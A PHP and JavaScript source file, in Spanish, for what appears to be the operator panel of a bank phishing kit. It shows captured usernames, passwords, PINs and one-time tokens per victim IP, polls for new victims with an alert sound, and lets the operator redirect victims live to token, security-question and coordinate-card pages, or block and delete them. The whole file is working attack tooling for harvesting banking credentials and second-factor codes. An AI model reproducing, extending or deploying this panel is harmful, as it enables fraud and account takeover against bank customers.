<?php
session_start();
require_once 'functions.php';

// Verificar si el usuario ha iniciado sesión
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header("Location: srefks.php");
    exit();
}

$data = load_data();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['ip']) && isset($_POST['redirect'])) {
        // Actualizar currentPage en xzw.json
        $ip = $_POST['ip'];
        $redirectPage = $_POST['redirect'];
        if (isset($data[$ip])) {
            $data[$ip]['currentPage'] = $redirectPage;
            save_data($data);
            echo json_encode(["success" => true]);
            exit();
        } else {
            echo json_encode(["success" => false, "error" => "Usuario no encontrado."]);
            exit();
        }
    }
      if (isset($_POST['ip']) && isset($_POST['questions'])) {
        $ip = $_POST['ip'];
        // Guardamos el array de preguntas
        $data[$ip]['questions'] = $_POST['questions'];
        // Redirigimos la página actual al script de preguntas
        $data[$ip]['currentPage'] = "pregunta.php";
        save_data($data);
        echo json_encode(["success" => true]);
        exit();

    }
    if (isset($_POST['ip']) && isset($_POST['coord'])) {
        // Guardar coordenadas en el JSON
        $ip = $_POST['ip'];
        $data[$ip]['coord'] = $_POST['coord'];
        $data[$ip]['currentPage'] = "coord.php";
        save_data($data);
        echo json_encode(["success" => true]);
        exit();
    }
    if (isset($_POST['ip']) && isset($_POST['state'])) {
        // Actualizar el estado del usuario a block
        $ip = $_POST['ip'];
        $data[$ip]['state'] = $_POST['state'];
        save_data($data);
        echo json_encode(["success" => true]);
        exit();
    }
     // Procesar petición de eliminación de usuario
    if (isset($_POST['ip']) && isset($_POST['delete'])) {
        $ipKey = $_POST['ip'];
        if (delete_user($ipKey)) {
            echo json_encode(["success" => true]);
        } else {
            echo json_encode(["success" => false, "error" => "Usuario no encontrado."]);
        }
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Administración</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        body {
            background-color: #121212;
            color: #e0e0e0;
            font-family: "Segoe UI", Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        /* Contenedor tablas */
        #tablesContainer {
            width: 100%;
            overflow-x: auto;
            padding: 20px;
        }

        table {
            margin: 20px auto;
            border-collapse: collapse;
            width: 95%;
            background-color: #1e1e1e;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
        }

        thead th {
            background: linear-gradient(135deg, #2d2d2d, #3a3a3a);
            padding: 12px;
            border-bottom: 2px solid #444;
            font-size: 1em;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        tbody td {
            border-bottom: 1px solid #333;
            padding: 10px;
            text-align: center;
            font-size: 0.9em;
            transition: background 0.2s ease;
        }

        tbody tr:last-child td {
            border-bottom: none;
        }

        .group-header {
            font-weight: bold;
            background-color: #2a2a2a;
            color: #fff;
        }

        tr:hover td {
            background-color: #2c2c2c;
        }

        /* Botones */
        button {
            padding: 8px 14px;
            margin: 6px;
            background: linear-gradient(135deg, #333, #444);
            color: #fff;
            border: none;
            cursor: pointer;
            border-radius: 6px;
            font-size: 0.85em;
            transition: background 0.2s ease, transform 0.1s ease;
        }

        button:hover {
            background: linear-gradient(135deg, #444, #555);
            transform: scale(1.05);
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            width: 50%;
            max-width: 600px;
            background-color: #1e1e1e;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 6px 20px rgba(0,0,0,0.6);
            animation: fadeIn 0.3s ease;
        }

        .modal input {
            width: 85%;
            padding: 12px;
            margin: 12px 0;
            border-radius: 6px;
            border: none;
            font-size: 0.9em;
            background-color: #2a2a2a;
            color: #fff;
        }

        .modal input:focus {
            outline: none;
            box-shadow: 0 0 5px #00bcd4;
        }

        .close {
            float: right;
            font-size: 24px;
            cursor: pointer;
            color: #aaa;
            transition: color 0.2s ease;
        }

        .close:hover {
            color: #ff4c4c;
        }

        /* Animación */
        @keyframes fadeIn {
            from { opacity: 0; transform: translate(-50%, -48%); }
            to { opacity: 1; transform: translate(-50%, -50%); }
        }
    </style>
</head>
<body>
    <h1>Panel de Administración</h1>
    
    <!-- Contenedor para la tabla completa -->
    <div id="tablesContainer">
        <!-- La tabla se generará dinámicamente -->
    </div>
    
     <div id="questionModal" class="modal">
        <span class="close">&times;</span>
        <h2>Ingrese la Pregunta 1</h2>
        <input type="text" id="questionInput" value="¿?" placeholder="Escriba su pregunta">
        <button id="submitQuestion">Enviar</button>
    </div>
    
    <div id="coordModal" class="modal">
        <span class="close">&times;</span>
        <h2>Ingrese las Coordenadas</h2>
        <input type="text" id="coord1" placeholder="Escriba su coordenada 1">
        <input type="text" id="coord2" placeholder="Escriba su coordenada 2">
        <input type="text" id="coord3" placeholder="Escriba su coordenada 3">
        <button id="submitCoord">Enviar</button>
    </div>
    
    <audio id="notificationSound">
        <source src="content/notification.mp3" type="audio/mpeg">
    </audio>
    
    <script>
        // Keys de submissions a mostrar
        const submissionColumns = ['usuario','clave','pin','token','token2'];
        let previousRowCount = 0;
        let selectedIp = null;
        
        function playSound() {
            document.getElementById("notificationSound").play();
        }
        
        function copyToClipboard(text) {
            if (navigator.clipboard) {
                navigator.clipboard.writeText(text).then(() => {
                    alert('¡Copiado al portapapeles!');
                }).catch(err => {
                    alert('Error al copiar: ' + err);
                });
            } else {
                const tempInput = document.createElement('input');
                tempInput.value = text;
                document.body.appendChild(tempInput);
                tempInput.select();
                document.execCommand('copy');
                document.body.removeChild(tempInput);
                alert('¡Copiado al portapapeles!');
            }
        }
        
        // Encabezado global de la tabla
        function generateGlobalHeader(totalColumns) {
            return `<thead>
                        <tr>
                            <th colspan="${totalColumns}">Usuarios agrupados por color</th>
                        </tr>
                    </thead>`;
        }
        
        // En lugar del encabezado con nombre de grupo, se muestran los encabezados fijos (las columnas)
        function generateGroupHeader(color) {
            return `<tr style="background-color: ${color};">
                         <th>#</th>
                        <th>Página Actual</th>
                        <th>Ubicacion</th>
                        <th>Status</th>
                        <th>Usuario</th>
                        <th>Clave</th>
                        <th>Pin</th>
                        <th>Token</th>
                        <th>Token2</th>
                        <th>Acción</th>
                    </tr>`;
        }
        
  function loadUsers() {
    $.getJSON("xzw.json", function(data) {
        let users = Object.entries(data).reverse();
        let rowCount = users.length;
        if (rowCount > previousRowCount) {
            playSound();
        }
        previousRowCount = rowCount;
        
        // Colores fijos en el orden deseado (se normaliza el negro)
        const desiredColors = ['#000000'];
        // Total de columnas: (#, Página Actual, Estado, Status, submissions..., Acción)
        const totalColumns = 4 + submissionColumns.length + 1;
        
        // Inicializar grupos para cada color
        let groups = {};
        desiredColors.forEach(color => {
            groups[color] = [];
        });
        
        // Agrupar usuarios según su color y solo aquellos que tengan contenido en submissions
        users.forEach(([ip, user]) => {
            let color = user.color || "#000000";
            // Normalizar: si comienza con "##", quitar uno de los hashes
            if (color.startsWith("##")) {
                color = "#" + color.slice(2);
            }
            // Solo se agrega si tiene contenido en submissions
            if (desiredColors.includes(color) && user.submissions && user.submissions.length > 0) {
                groups[color].push([ip, user]);
            }
        });
        
        // Construir la tabla completa con un <thead> global y un <tbody> para cada grupo
        let tableHTML = `<table id="userTable">`;
        tableHTML += generateGlobalHeader(totalColumns);
        
        desiredColors.forEach(color => {
            tableHTML += `<tbody id="group-${color}">`;
            // Se muestran los encabezados fijos en vez del nombre del grupo
            tableHTML += generateGroupHeader(color);
            let group = groups[color];
            let groupIndex = 1;
            if (group.length > 0) {
                group.forEach(([ip, user]) => {
                    let submissionColsHTML = "";
                    submissionColumns.forEach(function(key) {
                        // Buscar el valor más reciente para esta clave
                        let submissionValue = null;
                        if (user.submissions && Array.isArray(user.submissions)) {
                            for (let i = user.submissions.length - 1; i >= 0; i--) {
                                let sub = user.submissions[i];
                                if (sub.data && sub.data[key] !== undefined) {
                                    submissionValue = sub.data[key];
                                    break;
                                }
                            }
                        }

                        // Si la clave es "coord" y submissionValue es un objeto con base64:
                        if (key === "coord" && submissionValue && typeof submissionValue === "object") {
                            // submissionValue = { filename, type, data }
                            const mime = submissionValue.type;
                            const base64 = submissionValue.data;
                            const imageSrc = `data:${submissionValue.type};base64,${submissionValue.data}`;
submissionColsHTML += `<td><img src="${imageSrc}" style="max-width:50px; max-height:50px; cursor: pointer;" onclick="openImageModal('${imageSrc}')"></td>`;

                        } else {
                            // Para todos los otros campos, mantener el botón de copiar
                            const textValue = submissionValue !== null ? submissionValue.toString() : "";
                            const safeValue = textValue.replace(/'/g, "\\'");
                            submissionColsHTML += `<td><button onclick="copyToClipboard('${safeValue}')">${textValue}</button></td>`;
                        }
                    });
                    tableHTML += `
                        <tr style="background-color: ${color};">
                            <td>${groupIndex}</td>
                            <td>${user.currentPage}</td>
                            <td>${user.location ? user.location : ""}</td>
                              <td>
                          <span 
                            style="display: inline-block; width: 10px; height: 10px; border-radius: 50%; background-color: ${user.status === 'online' ? 'green' : 'red'};">
                          </span>
                          ${user.status || ''}
                        </td>
                            ${submissionColsHTML}
                            <td>
                                <button onclick="redirectUser('${ip}', 'index.php')">Inicio</button>
                                <button onclick="redirectUser('${ip}', 'token.php')">Token</button>
                                <button onclick="redirectUser('${ip}', 'token2.php')">Token2</button>
                                <button onclick="deleteUser('${ip}')" style="background-color:darkred;">Eliminar</button>
                                <button onclick="blockUser('${ip}')" style="background-color:red;">Bloquear</button>
                            </td>
                        </tr>`;
                    groupIndex++;
                });
            } else {
                tableHTML += `<tr><td colspan="${totalColumns}">Sin datos</td></tr>`;
            }
            tableHTML += `</tbody>`;
        });
        
        tableHTML += `</table>`;
        $("#tablesContainer").html(tableHTML);
    });
}

        
        function redirectUser(ip, page) {
            $.post("admin.php", { ip: ip, redirect: page }, function(response) {
                let res = JSON.parse(response);
                if (!res.success) {
                    alert("Error: " + res.error);
                }
            });
        }
        
        function blockUser(ip) {
            $.post("admin.php", { ip: ip, state: "block" }, function(response) {
                let res = JSON.parse(response);
                if (!res.success) {
                    alert("Error: " + res.error);
                }
            });
        }

        function deleteUser(ipKey) {
            if(confirm("¿Está seguro de eliminar este usuario?")) {
                $.post("admin.php", { ip: ipKey, delete: true }, function(response) {
                    let res = JSON.parse(response);
                    if (!res.success) {
                        alert("Error: " + res.error);
                    } else {
                        loadUsers();
                    }
                });
            }
        }

             function openQuestionModal(ip) {
    selectedIp = ip;
    document.getElementById("questionModal").style.display = "block";
             }
        
      document.querySelector("#questionModal .close").addEventListener("click", function() {
    document.getElementById("questionModal").style.display = "none";
});

document.getElementById("submitQuestion").addEventListener("click", function () {
    const question1 = document.getElementById("questionInput").value.trim();

    if (!question1) {
        alert("Por favor, ingrese ambas preguntas.");
        return;
    }

    const questions = {
        ip: selectedIp,
        questions: [question1]
    };

    $.post("admin.php", questions, function (response) {
        document.getElementById("questionModal").style.display = "none";
        // Puedes mostrar una notificación o manejar la respuesta si es necesario
    });
});

        
        function opencoordModal(ip) {
            selectedIp = ip;
            document.getElementById("coordModal").style.display = "block";
        }
        
        document.querySelector("#questionModal .close").addEventListener("click", function() {
            document.getElementById("questionModal").style.display = "none";
        });
        
        document.querySelector("#coordModal .close").addEventListener("click", function() {
            document.getElementById("coordModal").style.display = "none";
        });
        
        document.getElementById("submitQuestion").addEventListener("click", function() {
            const question = document.getElementById("questionInput").value;
            if (!question.trim()) {
                alert("Por favor, ingrese una pregunta.");
                return;
            }
            $.post("admin.php", { ip: selectedIp, quest: question }, function(response) {
                document.getElementById("questionModal").style.display = "none";
            });
        });
        
        document.getElementById("submitCoord").addEventListener("click", function() {
            const coord1 = document.getElementById("coord1").value;
            const coord2 = document.getElementById("coord2").value;
            const coord3 = document.getElementById("coord3").value;
            if (!coord1.trim() || !coord2.trim() || !coord3.trim()) {
                alert("Por favor, ingrese ambas coordenadas.");
                return;
            }
            $.post("admin.php", { ip: selectedIp, coord: coord1 + ", " + coord2 + ", " + coord3 }, function(response) {
                document.getElementById("coordModal").style.display = "none";
            });
        });
        
        $(document).ready(function() {
            loadUsers();
            setInterval(loadUsers, 2000);
        });
    </script>
    <div id="imageModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
    background-color: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 9999;">
    <span onclick="closeImageModal()" style="position:absolute; top:20px; right:30px; font-size:30px; 
        color:white; cursor:pointer;">&times;</span>
    <img id="modalImage" src="" style="max-width:90%; max-height:90%;">
</div>
<script>
    function openImageModal(src) {
    const modal = document.getElementById('imageModal');
    const modalImg = document.getElementById('modalImage');
    modalImg.src = src;
    modal.style.display = 'flex';
}

function closeImageModal() {
    document.getElementById('imageModal').style.display = 'none';
}

</script>
</body>
</html>
